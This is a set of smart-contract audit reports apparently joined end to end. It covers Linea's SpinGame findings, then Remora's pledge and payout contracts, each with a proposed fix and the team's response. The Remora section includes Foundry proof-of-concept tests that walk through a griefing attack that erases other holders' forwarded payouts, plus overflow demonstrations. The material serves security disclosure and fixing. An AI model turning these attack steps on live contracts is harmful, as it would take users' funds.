**Linea:** Fixed in commit [`02d6d57`](https://github.com/Consensys/linea-hub/pull/551/commits/02d6d576cced6a6926ae12e2f187d8ef2fee771e)

**Cyfrin:** Verified. `lotAmount` no verified to be non-zero when a new prize is added.


### Asynchronous VRF request fulfillment uses stale or incorrect parameters due to lack of request-specific data tracking

**Description:** The `SpinGame` contract has a critical architectural flaw in how it handles asynchronous VRF requests. The contract stores user boost values and prize configurations globally rather than tying them to specific requests, leading to inconsistent game behavior when prize structures change or users make multiple participation requests.

There are two primary issues:

First, prize configurations lack versioning. The `SpinGame::updatePrizes` function completely resets the prize structure by deleting existing `prizeIds` and resetting `totalProbabilities` to zero before adding new prizes. When a user calls `SpinGame::participate`, they receive a signature based on the current prize structure. However, if `SpinGame::updatePrizes` is called between the request and VRF fulfillment, the `SpinGame::_fulfillRandomness` function will use the updated prize structure instead of the one the user expected when participating. This means users could win entirely different prizes than what was available when they participated.

Second, request-specific data is not properly tracked. The `SpinGame::participate` function stores the user's boost value in `userToBoost[user]`, but this mapping gets overwritten if the same user participates again with a different boost before the first request is fulfilled. When `SpinGame::_fulfillRandomness` executes, it retrieves the boost using `uint64 userBoost = userToBoost[user]`, which may not be the boost value from the original request. This creates scenarios where a user who participated with a 150% boost could have their request fulfilled with a 500% boost if they made a second participation with higher boost before the first VRF callback.

The contract only tracks minimal request data through `requestIdToUser` and `requestIdTimestamp` mappings, but fails to capture the complete context needed for proper request fulfillment including the specific boost value and prize structure version at request time.

**Impact:** Users may receive different prizes or win probabilities than expected when they participated, leading to unfair game outcomes and potential loss of funds.

```
// Scenario 1: Prize structure changes between request and fulfillment
1. User calls participate() when Prize A (50% chance) and Prize B (30% chance) are available
2. Controller calls updatePrizes() with Prize C (60% chance) and Prize D (20% chance)
3. VRF fulfills the request using new prize structure with C and D instead of A and B

// Scenario 2: Multiple participations with different boosts
1. User calls participate() with 150% boost, gets requestId1
2. User calls participate() with 500% boost, gets requestId2
3. VRF fulfills requestId1 but uses 500% boost instead of 150%
```

**Recommended Mitigation:** Implement request-specific data tracking with prize versioning:

```diff
+ uint256 public prizeVersion;
+ mapping(uint256 requestId => uint64 boost) public requestIdToBoost;
+ mapping(uint256 requestId => uint256 prizeVersion) public requestIdToPrizeVersion;

function updatePrizes(Prize[] calldata _prizes) external onlyController {
    delete prizeIds;
    totalProbabilities = 0;
+   prizeVersion++;
    _addPrizes(_prizes);
}

function participate(
    uint64 _nonce,
    uint256 _expirationTimestamp,
    uint64 _boost,
    Signature calldata _signature
) external returns (uint256) {
    // ... existing validation ...

-   userToBoost[user] = _boost;
    uint256 requestId = _requestRandomness("");

    requestIdToUser[requestId] = user;
    requestIdTimestamp[requestId] = block.timestamp;
+   requestIdToBoost[requestId] = _boost;
+   requestIdToPrizeVersion[requestId] = prizeVersion;

    // ... rest of function ...
}

function _fulfillRandomness(
    uint256 _randomness,
    uint256 _requestId,
    bytes memory
) internal override {
    address user = requestIdToUser[_requestId];
    if (user == address(0)) {
        revert InvalidRequestId(_requestId);
    }

+   // Verify prize version hasn't changed
+   if (requestIdToPrizeVersion[_requestId] != prizeVersion) {
+       revert PrizeVersionMismatch();
+   }

-   uint64 userBoost = userToBoost[user];
+   uint64 userBoost = requestIdToBoost[_requestId];

    // ... rest of fulfillment logic ...

+   delete requestIdToBoost[_requestId];
+   delete requestIdToPrizeVersion[_requestId];
}
```

**Linea:** Acknowledged. We have discussed L2 issue internally. We decided to not fix it because the prizes will be generally the same just with new allocations. In the case of different prizes, we are okay with the behavior that users can win different prizes.

\clearpage
## Informational


### Overcomplicated `_addPrizes` function designed for incremental updates but only used for complete prize resets

**Description:** The `SpinGame::_addPrizes` function was originally designed to incrementally add new prizes to an existing prize pool while preserving existing prizes. However, the function is only called by `SpinGame::updatePrizes`, which first completely resets the prize state by calling `delete prizeIds` and setting `totalProbabilities = 0`. This makes the preservation logic in `_addPrizes` unnecessary and creates several inefficiencies:

1. The function copies the existing `prizeIds` array into `existingArray`, which is always empty after the reset
2. It creates a new array with size `len + existingArrayLen` where `existingArrayLen` is always 0
3. It loops through the empty existing array to copy non-existent prize IDs

The current implementation effectively replaces the entire prize pool but retains incremental addition logic, left over from a [removed](https://github.com/Consensys/linea-hub/commit/21b48096edbd436311bb4ef688d1b5367c1121ff) `SpinGame::addBatchPrizes` function, which no longer serves a meaningful purpose.

**Impact:** The overcomplicated implementation increases gas costs and code complexity without providing any functional benefit since the incremental addition logic is never utilized.

**Recommended Mitigation:** Since `updatePrizes` always performs a complete reset, we can simplify `_addPrizes` to remove preservation logic and rename it to `_setPrizes`.

**Linea:** Fixed in [PR#558](https://github.com/Consensys/linea-hub/pull/558), commits [`0d8611d`](https://github.com/Consensys/linea-hub/pull/558/commits/0d8611dd06a8c51fe34d1379a2ff7d0bfee1e503), [`f9b1bd2`](https://github.com/Consensys/linea-hub/pull/558/commits/f9b1bd2428dc2d592b182ad99cbf39e18deb6b41), [`e115331`](https://github.com/Consensys/linea-hub/pull/558/commits/e1153312dfdf4851feaf645c2f11efebd5381188), [`2d619e1`](https://github.com/Consensys/linea-hub/pull/558/commits/2d619e104839a017d25e00ba667d340c455f227b), [`7920d00`](https://github.com/Consensys/linea-hub/pull/558/commits/7920d00601ae2c3b31897e62b7faee20bebd271f)

**Cyfrin:** Verified.
* `updatePrizes` renamed to `setPrizes`
* `existingArray` logic removed, no iterating over the previous array.
* delete of `prizeIds` removed, `prizeIds` instead overwritten with the memory array `newPrizeIds`


### Incorrect and misleading comments throughout the codebase create confusion

**Description:** The SpinGame contract and ISpin interface contain multiple incorrect, misleading, and inconsistent comments that do not accurately describe the functionality of the code they document. These comments create confusion for developers, auditors, and future maintainers of the codebase.

1. **Line 458 in `SpinGame::_operator()`**: The comment states "Returns the address of the dedicated _msgSender()" which is incorrect. The function returns the `vrfOperator` address, not anything related to `_msgSender()`. This function specifies which address is authorized to call the VRF fulfillment callback. We guess this comment was copied from the `GelatoVRFConsumerBase` without careful consideration.

2. **Line 123 in `SpinGame::getPrize()`**: The `@param _prizeId` comment states "Id of the prize to claim" which is misleading since this is a view function that only returns prize information, not a claiming function.

3. **Line 132 in `SpinGame::getUserPrizesWon()`**: The `@return` comment states "Amounts of prize won" when the function actually returns the count/number of times each prize was won, not token amounts.

4. **Line 59**: The mapping comment states "(userAddress => prizeId => amountOfPrizeIdWon)" but uses "amount" terminology when it actually tracks the number of times a prize was won.

5. **Line 32**: The comment "Last used prizeId" is misleading because `latestPrizeId` represents the next available prize ID, not the last used one.

6. **Line 157 in `SpinGame::getPrizesAmount()`**: The `@return` comment states "PrizesAmount The amount of prizes available" but the variable name suggests it's a count, not an amount. This creates ambiguity about whether it refers to quantity or value.

7. **Lines 290, 300, 309**: The admin withdraw functions are labeled as `@dev Controller function` but they actually require `DEFAULT_ADMIN_ROLE`, not `CONTROLLER_ROLE`.

8. **Line 465**: The `@param _prizes` comment states "Prizes to update" which doesn't clearly indicate this function completely replaces all existing prizes rather than updating them.

**Impact:** Incorrect documentation can lead to implementation errors, security vulnerabilities, and wasted development time as developers may rely on misleading comments instead of analyzing the actual code behavior.

**Recommended Mitigation:** Update all misleading comments to accurately reflect the actual functionality:

```diff
- /// @notice Returns the address of the dedicated _msgSender().
+ /// @notice Returns the address of the VRF operator authorized to fulfill randomness requests.

- /// @param _prizeId Id of the prize to claim.
+ /// @param _prizeId Id of the prize to retrieve information for.

- /// @return Amounts of prize won.
+ /// @return Number of times each prize was won by the user.

- /// @notice Last used prizeId.
+ /// @notice Next available prize ID to be assigned.

- /// @dev Controller function to withdraw ERC20 tokens from the contract.
+ /// @dev Admin function to withdraw ERC20 tokens from the contract.

- /// @param _prizes Prizes to update.
+ /// @param _prizes Prizes to replace all existing prizes with.
```


**Linea:** Fixed in commits [`9f9d9fd`](https://github.com/Consensys/linea-hub/pull/554/commits/9f9d9fd76d2672f572e31079b5811bf6f0f48eed) and [`b407331`](https://github.com/Consensys/linea-hub/pull/554/commits/b407331d5dee4fa6e8d70855230d4f26ca0a9b11).

**Cyfrin:** Verified. Comments corrected.


### Stale request id mapping persists for losing spins

**Description:** One change from the previous version of `SpinGame` is the removal of the "LuckyNFT," which served as a consolation prize for users who did not win a "proper" prize.

As part of this change, the clearing of the request mapping (`requestIdToUser`) was moved so that it now occurs **only** in the prize win path, as shown in [`SpinGame::_fulfillRandomness`](https://github.com/Consensys/linea-hub/blob/0af327319636960e9683897c5935aa1a78d1ded5/contracts/src/Spin.sol#L604-L612):

```solidity
            userToPrizesWon[user][selectedPrizeId] += 1;
            delete requestIdToUser[_requestId];
            emit PrizeWon(user, selectedPrizeId);

            return;
        }
    }
    emit NoPrizeWon(user);
}
```

However, it is considered good housekeeping to clear the `requestIdToUser` mapping regardless of whether the user wins or not. This ensures consistent state cleanup and prevents potential stale entries from persisting.

Consider unconditionally clearing the request mapping as follows:
```diff
function _fulfillRandomness(
    uint256 _randomness,
    uint256 _requestId,
    bytes memory
) internal override {
    address user = requestIdToUser[_requestId];
    if (user == address(0)) {
        revert InvalidRequestId(_requestId);
    }
+   delete requestIdToUser[_requestId];

    ...

            userToPrizesWon[user][selectedPrizeId] += 1;
-           delete requestIdToUser[_requestId];
            emit PrizeWon(user, selectedPrizeId);


            return;
        }
    }
    emit NoPrizeWon(user);
}
```

**Linea:** Fixed in commit [`9f9d9fd`](https://github.com/Consensys/linea-hub/pull/554/commits/9f9d9fd76d2672f572e31079b5811bf6f0f48eed)

**Cyfrin:** Verified. `requestIdToUser` deleted at the beginning of `_fulfillRandomness`.


### Missing `_disableInitializers()` in constructor

**Description:** The `SpinGame` contract is upgradeable but does **not** call `_disableInitializers()` in its constructor. In upgradeable contract patterns, this call is a best practice to prevent the implementation (logic) contract from being initialized directly.

While this doesnt affect the proxys behavior, it helps protect against accidental or malicious use of the implementation contract in isolation, especially in environments where both proxy and implementation contracts are visible, like block explorers.

Consider adding the following line to the constructor of the `SpinGame` contract:

```solidity
constructor(address _trustedForwarderAddress) ERC2771ContextUpgradeable(_trustedForwarderAddress) {
    _disableInitializers();
}
```

This ensures that the implementation contract cannot be initialized independently.

**Linea:** Fixed in commit [`9f9d9fd`](https://github.com/Consensys/linea-hub/pull/554/commits/9f9d9fd76d2672f572e31079b5811bf6f0f48eed)

**Cyfrin:** Verified. Constructor now calls `_disableInitializers`.


### `GelatoVRFConsumerBase` is not upgrade-safe

**Description:** The `SpinGame` contract has been changed to be upgradeable. But, the contract inherits from `GelatoVRFConsumerBase`, which is not upgrade-safe as it lacks a reserved storage gap (`uint256[x] private __gap`) to prevent future storage collisions. This poses a risk if the `GelatoVRFConsumerBase` contract is modified upstream (e.g. adds state variables), it could lead to storage layout corruption during upgrades.

Since `GelatoVRFConsumerBase` is an external dependency outside the control of the audited codebase, this risk cannot be addressed directly within that contract.

However to mitigate the risk, consider adding a storage buffer to account for potential future changes in `GelatoVRFConsumerBase`. This can be done by:

1. Adding a `_gap` in `SpinGame` itself:

   ```solidity
   uint256[x] private __gelatoBuffer;
   ```

2. Alternatively, inserting an intermediate "buffer" contract in the inheritance chain that exists solely to reserve storage space:

   ```solidity
   contract GelatoVRFGap {
       uint256[x] private __gap;
   }

   contract SpinGame is ..., GelatoVRFConsumerBase, GelatoVRFGap
   ```

This ensures that even if `GelatoVRFConsumerBase` adds storage in the future, it won't overwrite critical storage slots in `SpinGame`.

**Linea:** Fixed in commit [`9f9d9fd`](https://github.com/Consensys/linea-hub/pull/554/commits/9f9d9fd76d2672f572e31079b5811bf6f0f48eed)

**Cyfrin:** Verified, first storage slots in the contract now is `uint256[50] private __gelatoBuffer`


### `latestPrizeId` name is misleading

**Description:** As part of changes in this audit, the `latestPrizeId` variable now functions as a counter for the next available prize ID, rather than tracking the most recently used one as in the previous version. This creates a naming mismatch, since `latestPrizeId` no longer reflects its actual behavior.

The function `_addPrizes` even caches it as `nextPrizeId`, which is a more accurate description. Consider renaming it as `nextPrizeId`.

**Linea:** Fixed in commits [`8266a91`](https://github.com/Consensys/linea-hub/pull/555/commits/8266a9130db2e3ad9d66422c7c1c374dc806bada) and [`dd8de7b`](https://github.com/Consensys/linea-hub/pull/555/commits/dd8de7bd9626abca6c01bc24832551c8f50ef0a9)

**Cyfrin:** Verified. Field renamed to `nextPrizeId` and stack variable in `__addPrizes` renamed to `currentPrizeId`.

\clearpage
## Gas Optimization


### Cache `signer` in `SpinGame::participate`

**Description:** In `SpinGame::participate`, the `signer` state variable is accessed multiple times:

```solidity
address recoveredSigner = ECDSA.recover(...);
if (recoveredSigner != signer || signer == address(0)) {
    revert SignerNotAllowed(recoveredSigner);
}
```

In contrast, `SpinGame::claimPrize` caches `signer` to a local variable (`cachedSigner`) before comparison. This avoids redundant storage reads, which are more expensive than local memory accesses.

Considerer caching `signer` in a local variable at the start of the relevant check in `SpinGame::participate` as well.

**Linea:** Fixed in commit [`0290123`](https://github.com/Consensys/linea-hub/pull/557/commits/02901233dbe9a184b80bffb67bf5d489bc015a10)

**Cyfrin:** Verified. `signer` is cached and the cached value is used in the comparisons.


### Cache `prize.probability` before first use

**Description:** In `SpinGame::_fulfillRandomness()`, `prize.probability` is first read in an `if` statement, and then cached immediately afterward:

```solidity
if (prize.probability == 0) {
    continue;
}
uint64 prizeProbability = prize.probability;
```

This results in an unnecessary initial storage read before caching. Consider caching it above the `if`-statement.

**Linea:** Fixed in commit [`0290123`](https://github.com/Consensys/linea-hub/pull/557/commits/02901233dbe9a184b80bffb67bf5d489bc015a10)

**Cyfrin:** Verified. The caching of `prize.probability` is moved above the `if` and the cached value is used in the comparison.


### Cache `prize.amount` in `SpinGame::_transferPrize`

**Description:** In `SpinGame::_transferPrize`, when transferring either an ERC20 or native token prize, the `prize.amount` field is read three times: once for the `if` check, once to compare against the contract balance, and again when executing the transfer:

```solidity
if (prize.amount > 0) {
    ...
    if (contractBalance < prize.amount) {
        revert PrizeAmountExceedsBalance(..., prize.amount, contractBalance);
    }
    ...
    token.safeTransfer(_winner, prize.amount);
}
```

This results in three separate reads of the same storage slot. Since the value does not change during execution, it can be cached once.

Consider caching `prize.amount` at the head of the first if:

```solidity
uint256 amount = prize.amount;
if (amount > 0) {
    ...
    if (contractBalance < amount) {
        revert PrizeAmountExceedsBalance(..., amount, contractBalance);
    }
    ...
    token.safeTransfer(_winner, amount);
}
```

**Linea:** Fixed in commit [`0290123`](https://github.com/Consensys/linea-hub/pull/557/commits/02901233dbe9a184b80bffb67bf5d489bc015a10)

**Cyfrin:** Verified. `prize.amount` is now cached and the cached value is used.

\clearpage

------ FILE END car/reports_md/2025-06-30-cyfrin-linea-spingame-v2-v2.1.md ------


------ FILE START car/reports_md/2025-07-04-cyfrin-remora-pledge-v2.0.md ------

**Lead Auditors**

[Dacian](https://x.com/DevDacian)

[Stalin](https://x.com/Stalin_eth)

**Assisting Auditors**

 

---

# Findings
## Critical Risk


### `PledgeManager::pledge`, `refundTokens` will revert due to overflow when `pricePerToken * numTokens > type(uint32).max`

**Description:** `PledgeManager::pledge` multiplies two `uint32` variables and stores the result into a `uint256`, attempting to account for when the multiplication returns a value greater than `type(uint32).max`:
```solidity
uint256 stablecoinAmount = pricePerToken * numTokens; // account for overflow
```

`PledgeManager::refundTokens` does the same thing:
```solidity
uint256 refundAmount = numTokens * pricePerToken; //TOOD: overflow check
```

However this won't work correctly since if the result of the multiplication is greater than `type(uint32).max` the function will revert.

**Impact:** The maximum value of `uint32` is 4294967295. Since `pricePerToken` uses 6 decimals, the maximum possible `stablecoinAmount` is $4294.96 which is very low; pledging will be revert for many reasonable amounts that users will want to do.

The contract is also not upgradeable so this can't be fixed via upgrading.

**Proof of Concept:** You can easily verify this behavior using [chisel](https://getfoundry.sh/chisel/overview):
```solidity
$ chisel
Welcome to Chisel! Type `!help` to show available commands.
 uint32 a = type(uint32).max;
 uint32 b = 10;
 uint256 c = a * b;
Traces:
  [401] 0xBd770416a3345F91E4B34576cb804a576fa48EB1::run()
      [Revert] panic: arithmetic underflow or overflow (0x11)

Error: Failed to execute REPL contract!
```

**Recommended Mitigation:** Firstly consider increasing the size of `pricePerToken` and `numTokens`, since the max value of `uint32` is 4,294,967,295 which means:
* for price with 6 decimals, the maximum `pricePerToken` is $4294 which may be too small
* the maximum token amount is 4.29B which may work or also be too small
* simple solution: standardize all protocol token amounts to `uint128`

Secondly instead of multiplying two smaller types such as `uint32`, cast one of them to `uint256`:
```diff
- uint256 stablecoinAmount = pricePerToken * numTokens; // account for overflow
+ uint256 stablecoinAmount = uint256(pricePerToken) * numTokens;
```

Verify the fix via chisel:
```solidity
$ chisel
Welcome to Chisel! Type `!help` to show available commands.
 uint32 a = type(uint32).max;
 uint32 b = 10;
 uint256 c = uint256(a) * b;
 c
Type: uint256
 Hex: 0x9fffffff6
 Hex (full word): 0x00000000000000000000000000000000000000000000000000000009fffffff6
 Decimal: 42949672950
```

Consider these lines in `TokenBank::buyToken` whether a similar fix is needed there:
```solidity
// @audit can `amount * curData.pricePerToken * curData.saleFee > type(uint64).max`? If so then
// consider making a similar fix here to prevent overflow revert
        uint64 stablecoinValue = amount * curData.pricePerToken;
        uint64 feeValue = (stablecoinValue * curData.saleFee) / 1e6;
```

**Remora:** Fixed in commits [a0b277f](https://github.com/remora-projects/remora-smart-contracts/commit/a0b277fe4a59354f3b3783c4b8c06eb60f5157610), [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5).

**Cyfrin:** Verified.


### Distribution of payouts will revert due to overflow when payment is made using a stablecoin with high decimals

**Description:** Payouts are meant to be paid using a stablecoin, originally a stablecoin with 6 decimals (USDC). But the system has the capability of changing the stablecoin that is used for payments. Could be USDT (8 decimals), USDS (18 decimals).

As part of the changes made to introduce the PaymentSettler, the data type of the variable [`calculatedPayout` was changed from a uint256 to a uint64](https://github.com/remora-projects/remora-smart-contracts/blob/audit/Dacian/contracts/RWAToken/DividendManager.sol#L42). This change introduces a critical vulnerability that can cause an irreversible DoS to users to collect their payouts.

A uint64 would revert when distributing a payout of 20 USD using a stablecoin of 18 decimals.
- As we can see on chisel, 20e18 is > the max value a uint64 can fit
```
 bool a = type(uint64).max > 20e18;
 a
Type: bool
 Value: false
```

For example, there is a user who has 5 distributions pending to be calculated, and in the most recent distribution, the distribution is paid with a stablecoin of 18 decimals. (assume the user is earning 50USD on each distribution)
- When the user attempts to calculate its payout, the tx will revert because the last distribution will take the user's payout beyond the value that can fit in a uint64, so, when [safeCasting the payout down to a uint64](https://github.com/remora-projects/remora-smart-contracts/blob/audit/Dacian/contracts/RWAToken/DividendManager.sol#L435-L440), an overflow will occur, and tx will blow up, resulting in this user getting DoS from claiming not only the most recent payout, but all the previous payouts that haven't been calculated yet.

```solidity
    function payoutBalance(address holder) public returns (uint256) {
        ...
        for (uint16 i = payRangeStart; i >= payRangeEnd; --i) {
            ...

            PayoutInfo memory pInfo = $._payouts[i];
//@audit => `pInfo.amount` set using a stablecoin with high decimals will bring up the payoutAmount beyond the limit of what can fit in a uint64
            payoutAmount +=
                (curEntry.tokenBalance * pInfo.amount) /
                pInfo.totalSupply;
            if (i == 0) break; // to prevent potential overflow
        }
        ...
        if (payoutForwardAddr == address(0)) {
//@audit-issue => overflow will blow up the tx
            holderStatus.calculatedPayout += SafeCast.toUint64(payoutAmount);
        } else {
//@audit-issue => overflow will blow up the tx
            $._holderStatus[payoutForwardAddr].calculatedPayout += SafeCast
                .toUint64(payoutAmount);
        }
```

**Impact:** Irreversible DoS to holders' payouts distribution.

**Recommended Mitigation:** To solve this issue, the most straightforward fix is to change the data type of `calculatePayout` to at least `uint128` & consider standardizing all token amounts to `uint128`.

But, this time it is recommended to go one step further and normalize the internal accounting of the system to a fixed number of decimals in such a way that it won't be affected by the decimals of the actual stablecoin that is being used to process the payments.

As part of this change, the `PaymentSettler` contract must be responsible for converting the values sent and received from the RemoraToken to the actual decimals of the current configured stablecoin.

**Remora:** Fixed in commits [a0b277f](https://github.com/remora-projects/remora-smart-contracts/commit/a0b277fe4a59354f3b3783c4b8c06eb60f5157610), [ced21ba](https://github.com/remora-projects/remora-smart-contracts/commit/ced21ba9758b814eb48a09a5e792aa89cc87e8f5).

**Cyfrin:** Verified.


### A single holder can grief the payouts of all holders forwarding their payouts to the same forwarder

**Description:** This grief attack is similar to [issue [*Forwarders can lose payouts of the holders forwarding to them*](#forwarders-can-lose-payouts-of-the-holders-forwarding-to-them)](https://github.com/remora-projects/remora-smart-contracts/issues/49). The main difference is that this attack does not need the forwarder to gain holder status and zero out his balance on the same distributionIndex. This grief attack can be executed at any index while the forwarder has no balance.

The steps that allows the grief attack to occur are:
1. forwarder has balance, it is a holder
2. various holders set the same address as their designated forwarder
3. payouts for holders are computed and credited to forwarder
4. forwarder claims payouts, and gets computed all pending payouts
    - At this point, payoutBalance of forwarder would be 0
5. forwarder zeros out his balance, and [gets removed the `isHolder` status (no longer a holder)](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L596-L600)
6. distributions passes
7. One of the holders [removes the forwarder](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L215-L222) as his designated forwarder
    - [Because the forwarder has no balance, and is not a holder, the data of the forwarder will be deleted,](https://github.com/remora-projects/remora-smart-contracts/blob/main/contracts/RWAToken/DividendManager.sol#L362-L365) including any outstanding calculatedPayout that has been accumulated for the holders who set the forwarder as their forwarder.
8. As a result of step 7, the unclaimed payouts earned by the holder get lost

**Impact:**
- Payouts of holders forwarding to the same forwarder can be grief by a single holder.
- Holders forwarding their payouts to a non-holder account will lose their payouts if they remove the forwarder while he is still a non-holder.

**Proof of Concept:** Run the following test to reproduce the scenario described in the Description section.
```solidity
    function test_holderForcesForwarderToLosePayouts() public {
        address user1 = users[0];
        address user2 = users[1];
        address forwarder = users[2];

        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint * 8);
        _whitelistAndMintTokensToUser(user2, amountToMint);
        _whitelistAndMintTokensToUser(forwarder, amountToMint);

        // both users sets the same forwarder as their forwardAddress
        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);
        remoraTokenProxy.setPayoutForwardAddress(user2, forwarder);

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        // user2 must have 0 payout because it is forwarding to `forwarder`
        uint256 user2PayoutBalance = remoraTokenProxy.payoutBalance(user2);
        assertEq(user2PayoutBalance, 0, "Forwarding payout is not working as expected");

        //forwarder must have the full payout for the 5 distributions because both users are forwarding to him
        uint256 forwarderPayoutBalance = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(forwarderPayoutBalance, payoutDistributionAmount * 5, "Forwarding payout is not working as expected");

        // forwarder claims all the outstanding payout
        vm.startPrank(forwarder);
        remoraTokenProxy.claimPayout();
        assertEq(stableCoin.balanceOf(forwarder), forwarderPayoutBalance);

        // forwarder zeros out his PropertyToken's balance
        remoraTokenProxy.transfer(user2, remoraTokenProxy.balanceOf(forwarder));
        vm.stopPrank();

        assertEq(remoraTokenProxy.balanceOf(forwarder), 0);

        (bool isHolder) = remoraTokenProxy.getHolderStatus(forwarder).isHolder;
        assertEq(isHolder, false);

        // Distribute payouts for distributions 5 - 10
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        // user2 must have 0 payout because it is forwarding to `forwarder`
        user2PayoutBalance = remoraTokenProxy.payoutBalance(user2);
        assertEq(user2PayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint64 calculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(calculatedPayout, payoutDistributionAmount * 5, "Forwarder did not receive payout for holder forwarding to him");

        // user2 gets forwarder removed as its forwardedAddress
        remoraTokenProxy.removePayoutForwardAddress(user2);

        //@audit => When this vulnerability is fixed, we expect finalCalculatedPayout to be equals than calculatedPayout!
        (uint64 finalCalculatedPayout) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        //@audit-issue => user2 causes the payout of user1 to be lost, which is 4x the payout lose by him
        assertEq(finalCalculatedPayout, 0, "Forwarder did not lose payout of holder");
    }
```

There is a second scenario similar to the one explained in the description section. In this other scenario, the forwarder is a non-holder, and, after a couple of distributions, the holder decides to remove or change the current forwarder to a different address, which leads to unclaimed payouts being lost.
- Run the next test to demonstrate the previous scenario
```solidity
    function test_HolderLosesPayout_HolderRemovesForwarderWhoWasNeverAHolder() public {
        address user1 = users[0];
        address forwarder = users[1];

        uint256 amountToMint = 1;

        _whitelistAndMintTokensToUser(user1, amountToMint);

        remoraTokenProxy.setPayoutForwardAddress(user1, forwarder);

        // fund total payout amount to funding wallet
        uint64 payoutDistributionAmount = 100e6;

        // Distribute payouts for the first 5 distributions
        for(uint i = 1; i <= 5; i++) {
            _fundPayoutToPaymentSettler(payoutDistributionAmount);
        }

        // user1 must have 0 payout because it is forwarding to `forwarder`
        uint256 user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint64 forwarderPayoutBalance) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(forwarderPayoutBalance, payoutDistributionAmount * 5, "Forwarding payout is not working as expected");

        // forwarder attempts to claim all his payout while he is not a holder
        (bool isHolder) = remoraTokenProxy.getHolderStatus(forwarder).isHolder;
        assertEq(isHolder, false);
        // claiming reverts because forwarder is not a holder
        vm.prank(forwarder);
        vm.expectRevert();
        remoraTokenProxy.claimPayout();

        // user1 gets forwarder removed as its forwardedAddress
        remoraTokenProxy.removePayoutForwardAddress(user1);

        // validate forwarder and holder have lost the payouts for the past 5 distributions
        (forwarderPayoutBalance) = remoraTokenProxy.getHolderStatus(forwarder).calculatedPayout;
        assertEq(forwarderPayoutBalance, 0, "Forwarding payout is not working as expected");

        (uint256 finalForwarderPayoutBalance) = remoraTokenProxy.payoutBalance(forwarder);
        assertEq(finalForwarderPayoutBalance, 0, "Forwarding payout is not working as expected");

        // user1 must have 0 payout because it is forwarding to `forwarder`
        user1PayoutBalance = remoraTokenProxy.payoutBalance(user1);
        assertEq(user1PayoutBalance, 0, "Forwarding payout is not working as expected");
    }
```

**Recommended Mitigation:** On `_removePayoutForwardAddress()`, validate that the holderStatus of the forwardedAddress is 0, if it is not, don't call `deleteUser()`

```diff
function _removePayoutForwardAddress(
        HolderManagementStorage storage $,
        address holder,
        address forwardedAddress
    ) internal {
        if (forwardedAddress != address(0)) {
            ...
            if (
                balanceOf(forwardedAddress) == 0 &&
                payoutBalance(forwardedAddress) == 0
+              && $._holderStatus[forwardedAddress].calculatedPayout == 0
            ) deleteUser(forwardedHolder);
        }
```

**Remora:** Fixed in commit [7bd2691](https://github.com/remora-projects/remora-smart-contracts/commit/7bd269128ebeac7f2cae0e30d55ee666e8fa21d7).

**Cyfrin:** Verified.

\clearpage
## High Risk


### Attacker can make pledge on behalf of users if those users have approved `PledgeManager` to spend their tokens

**Description:** `PledgeManager` requires users to approve it to spend their tokens in order to make pledges. Users can do this by either:
1) using `IERC20Permit::permit` which enforces a nonce for the signer, deadline and domain separator
2) manually by calling `IERC20::approve`

If users use the manual method 2) and leave an open token approval, an attacker can call `PledgeManager::pledge` to make a pledge on their behalf since this function never enforces that `msg.sender == data.signer`.

**Impact:** Attacker can make pledges on behalf of innocent users which spends those users' tokens. It is common for users to have max approvals for protocols they use often, even though they don't intend to spend all their tokens with that protocol.

**Recommended Mitigation:** In `PledgeManager::pledge`, when not using `IERC20Permit::permit` enforce that `msg.sender == data.signer`:
```diff
        if (data.usePermit) {
            IERC20Permit(stablecoin).permit(
                signer,
                address(this),
                finalStablecoinAmount,
                block.timestamp + 300,
                data.permitV,
                data.permitR,
                data.permitS
            );
        }
+       else if(msg.sender != signer) revert MsgSenderNotSigner();
```

Alternatively always use `msg.sender` similar to how `PledgeManager::refundTokens` works.

**Remora:** Fixed in commit [e3bda7c](https://github.com/remora-projects/remora-smart-contracts/commit/e3bda7c78321febb0e2f37b29912ba24c9e04343) by always using `msg.sender` and also removed the permit method.

**Cyfrin:** Verified.


### Accounting on `PaymentSettler` will be corrupted when changing `stablecoin` that is used to process payments

**Description:** The accounting on the `PaymentSettler` will be initialized based on the decimals of the initial stablecoin that is used at the beginning of the system.
The system is capable of [changing the stablecoin that is used for the payments](https://github.com/remora-projects/remora-smart-contracts/blob/audit/Dacian/contracts/PaymentSettler.sol#L195-L198), and, when the stablecoin is changed for a stablecoin with different decimals, all the existing accounting will be messed up because the new amounts will vary from the existing values on the system.

This problem was introduced on the last change when the `PaymentSettler` was introduced to the system. On the previous version, the system correctly handled the decimals of the internal accounting to the decimals of the active stablecoin used for payments.

For example, 100 USD of fees that were generated while the stablecoin had 6 decimals would be only 1 USD if the stablecoin were changed to a stablecoin with 8 decimals.

**Impact:** Accounting on `PaymentSettler` will be corrupted when changing `stablecoin` to different decimals.

**Recommended Mitigation:** See recommendation for C-2.

